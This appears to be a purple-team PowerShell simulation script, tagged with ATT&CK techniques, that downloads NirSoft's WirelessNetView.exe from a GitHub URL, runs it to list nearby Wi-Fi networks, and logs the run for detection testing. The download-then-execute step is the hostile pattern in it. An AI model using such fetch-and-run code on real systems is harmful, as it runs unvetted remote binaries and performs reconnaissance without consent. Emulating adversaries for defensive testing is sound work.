<#
    T1588.002 - Obtain Capabilities: Tool
    T1049 - System Network Connections Discovery
    Discover nearby Wireless networks with Nirsoft tool WirelessNetView.exe
    Download WirelessNetView.exe from project https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WirelessNetView.exe and execute it 
#>

Start-Transcript -Path "$env:tmp\simulation_traces.log" -Append -Force

$url = "https://raw.githubusercontent.com/mthcht/Purpleteam/main/Simulation/Windows/_bin/WirelessNetView.exe"
$dumpfile = "$env:tmp\wifi_ssids.xml"
$outfile = "$env:tmp\wifi_ssids.exe"

# Download and execute WirelessNetView
try {
    Invoke-WebRequest $url -OutFile $outfile -Verbose
    if (Test-Path $outfile){
        Write-Host -ForegroundColor Green "Success: WirelessNetView.exe downloaded to $outfile"
        & $outfile /sxml $dumpfile
        sleep 1
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to download WirelessNetView.exe, $dumpfile not found."
    }
    if(test-path $dumpfile){
        Write-Host -ForegroundColor Green "Success: Nearby Wireless Networks extracted to $dumpfile"
    }
    else{
        Write-Host -ForegroundColor Red "Error: Failed to discover wireless networks and save them to $dumpfile"
    }
}
catch {
    Write-Host -ForegroundColor Red "`nErorr: $_"
}

Stop-Transcript
